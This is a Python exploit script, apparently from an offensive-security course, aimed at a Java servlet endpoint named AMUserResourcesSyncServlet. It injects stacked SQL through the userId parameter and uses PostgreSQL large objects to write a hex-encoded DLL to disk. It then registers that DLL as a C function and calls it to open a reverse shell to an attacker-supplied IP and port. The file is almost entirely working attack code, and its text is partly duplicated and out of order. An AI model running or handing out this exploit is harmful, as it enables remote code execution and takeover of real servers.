    target = sys.argv[1].strip()
    attacker_ip = sys.argv[2].strip()
    attacker_port = sys.argv[3].strip()

    base_url = f"https://{target}/servlet/AMUserResourcesSyncServlet"

    udf_hex = read_udf_hex()

    init_lo_table(base_url)
    cleanup_old_lo(base_url)
    create_lo(base_url)
    inject_udf(base_url, udf_hex)
    export_udf(base_url)
    create_udf_func(base_url)
    trigger_udf(base_url, attacker_ip, attacker_port)import sys
import math
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UDF_HEX_FILE = "rev_shell.dll.txt"
CHUNK_SIZE = 4096  # 2048 bytes = 4096 hex chars


def log(msg):
    print(msg)


def make_request(base_url, sql):
    payload = f"1;{sql};--+"

    params = {
        "ForMasRange": "1",
        "userId": payload
    }

    log("[*] SQL: " + sql[:120])

    r = requests.get(
        base_url,
        params=params,
        verify=False,
        timeout=10
    )

    return r


def init_lo_table(base_url):
    log("[+] Initializing LO tracking table...")

    sql = """
    CREATE TABLE IF NOT EXISTS awae_lo_store (
        id SERIAL PRIMARY KEY,
        loid OID,
        created_at TIMESTAMP DEFAULT now()
    )
    """

    make_request(base_url, sql)


def cleanup_old_lo(base_url):
    log("[+] Cleaning old LO records...")

    sql = """
    SELECT lo_unlink(loid)
    FROM awae_lo_store
    WHERE loid IS NOT NULL
    """

    make_request(base_url, sql)

    sql = "TRUNCATE TABLE awae_lo_store"

    make_request(base_url, sql)


def create_lo(base_url):
    log("[+] Creating Large Object and storing generated LOID...")

    sql = """
    INSERT INTO awae_lo_store(loid)
    SELECT lo_import($$C:\\windows\\win.ini$$)
    """

    make_request(base_url, sql)


def loid_subquery():
    return "(SELECT loid FROM awae_lo_store ORDER BY id DESC LIMIT 1)"


def inject_udf(base_url, udf_hex):
    log(f"[+] Injecting UDF payload, hex length = {len(udf_hex)}")

    total_pages = math.ceil(len(udf_hex) / CHUNK_SIZE)

    for page in range(total_pages):
        chunk = udf_hex[page * CHUNK_SIZE:(page + 1) * CHUNK_SIZE]

        if page == 0:
            sql = f"""
            UPDATE pg_largeobject
            SET data = decode($${chunk}$$, $$hex$$)
            WHERE loid = {loid_subquery()}
            AND pageno = {page}
            """
        else:
            sql = f"""
            INSERT INTO pg_largeobject(loid, pageno, data)
            VALUES (
                {loid_subquery()},
                {page},
                decode($${chunk}$$, $$hex$$)
            )
            """

        make_request(base_url, sql)

    log("[+] UDF payload injected into Large Object")


def export_udf(base_url):
    log("[+] Exporting DLL to target filesystem...")

    sql = f"""
    SELECT lo_export(
        {loid_subquery()},
        $$C:\\Users\\Public\\rev_shell.dll$$
    )
    """

    make_request(base_url, sql)


def create_udf_func(base_url):
    log("[+] Creating PostgreSQL C UDF function...")

    sql = """
    CREATE OR REPLACE FUNCTION rev_shell(text, integer)
    RETURNS void
    AS $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$
    LANGUAGE C STRICT
    """

    make_request(base_url, sql)


def trigger_udf(base_url, attacker_ip, attacker_port):
    log("[+] Triggering reverse shell...")

    sql = f"""
    SELECT rev_shell($${attacker_ip}$$, {int(attacker_port)})
    """

    make_request(base_url, sql)


def read_udf_hex():
    with open(UDF_HEX_FILE, "r", encoding="utf-8") as f:
        return f.read().strip()


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <target_ip:port> <attacker_ip> <attacker_port>")
        print(f"Example: python3 {sys.argv[0]} 192.168.171.113:8443 192.168.45.234 4444")
        sys.exit(1)

    target = sys.argv[1].strip()
    attacker_ip = sys.argv[2].strip()
    attacker_port = sys.argv[3].strip()

    base_url = f"https://{target}/servlet/AMUserResourcesSyncServlet"

    udf_hex = read_udf_hex()

    init_lo_table(base_url)
    cleanup_old_lo(base_url)
    create_lo(base_url)
    inject_udf(base_url, udf_hex)
    export_udf(base_url)
    create_udf_func(base_url)
    trigger_udf(base_url, attacker_ip, attacker_port)
```













